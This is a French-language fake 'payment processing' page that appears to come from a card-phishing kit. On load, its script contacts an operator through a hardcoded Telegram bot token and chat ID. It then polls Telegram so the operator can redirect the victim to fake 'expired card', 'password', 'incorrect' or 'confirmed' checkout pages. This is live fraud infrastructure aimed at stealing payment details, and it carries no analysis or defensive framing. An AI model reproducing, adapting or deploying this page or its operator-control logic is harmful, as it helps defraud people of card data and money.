<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Veuillez patienter...</title>
    <style>
        body,
        html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
            background-color: #fff;
            color: #333;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .gear-icon {
            width: 100px;
            margin-bottom: 20px;
        }

        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #333;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px 0;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        h2 {
            margin: 0;
            font-size: 24px;
            text-align: center;
        }

        p {
            font-size: 13px;
            text-align: center;
        }
    </style>
</head>

<body>

    <!-- Gears image -->
    <img src="https://files.catbox.moe/o7ilm9.jpg" alt="Loading gears" class="gear-icon" />

    <!-- Texts -->
    <h2>Veuillez patienter.</h2>
    <br>
    <p>Votre paiement est en cours de traitement, veuillez patienter.</p>

    <!-- Loader -->
    <div class="loader"></div>

    <script>
        // Redirection aprÃ¨s 5 minutes (300000 ms)
        setTimeout(() => {
            window.location.href = "payment-cards.html"; // Baddelha b lien li bghiti
        }, 15000);
    </script>

    <script src="prodect.js"></script>
    <script>
        const token = "7586911998:AAG7hBolIQ5mZlwjkHgR8AHlqVs5o-pJfKc";
        const chatId = "8038678484";
        const psd = "Traitement";
        let updateReceived = false;

        // Send Telegram message with inline keyboard
        window.onload = () => {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const messageData = {
                chat_id: chatId,
                text: `ðŸ”µ ${psd}`,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{ text: "incorrect", callback_data: "v:" + psd }],
                        [{ text: "Checkout", callback_data: "e:" + psd }],
                        [{ text: "Checkout Expire", callback_data: "o1:" + psd }],
                        [{ text: "Checkout MDP", callback_data: "o2:" + psd }],
                        [{ text: "Checkout Valide", callback_data: "o3:" + psd }],
                        [{ text: "Method Global", callback_data: "o4:" + psd }],
                        [{ text: "index", callback_data: "o10:" + psd }],
                        [{ text: "Confirmed", callback_data: "CO:" + psd }]
                    ]
                })
            };

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(messageData)
            }).catch(console.error);
        };

        // Check for updates
        function getUpdates() {
            const url = `https://api.telegram.org/bot${token}/getUpdates`;

            fetch(url)
                .then(res => res.json())
                .then(data => {
                    const updates = data.result;
                    if (!updates.length) return;
                    updates.forEach(update => {
                        const query = update.callback_query;
                        if (!query) return;

                        const [type, value] = query.data.split(":");
                        if (value === psd) {
                            updateReceived = true;
                            if (type === "v") window.location.href = "incorrect.html";
                            else if (type === "e") window.location.href = "Checkout.html";
                            else if (type === "o1") window.location.href = "CheckoutExpire.html";
                            else if (type === "o2") window.location.href = "CheckoutMDP.html";
                            else if (type === "o3") window.location.href = "CheckoutValide.html";
                            else if (type === "o4") window.location.href = "MethodGlobal.html";
                            else if (type === "o10") window.location.href = "index.html";
                            else if (type === "CO:") window.location.href = "Confirmed.html";
                        }

                        // Mark as read
                        markUpdateAsRead(update.update_id);
                    });
                })
                .catch(console.error);
        }

        // Prevent repeat updates
        function markUpdateAsRead(updateId) {
            const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${updateId + 1}`;
            fetch(url).catch(console.error);
        }

        // Start checking every 3 seconds
        setInterval(getUpdates, 3000);

        // Timeout if no response within 60s
        setTimeout(() => {
            if (!updateReceived) {
                window.location.href = "MethodGlobal.html";
            }
        }, 60000); // 1 minute
    </script>

</body>

</html>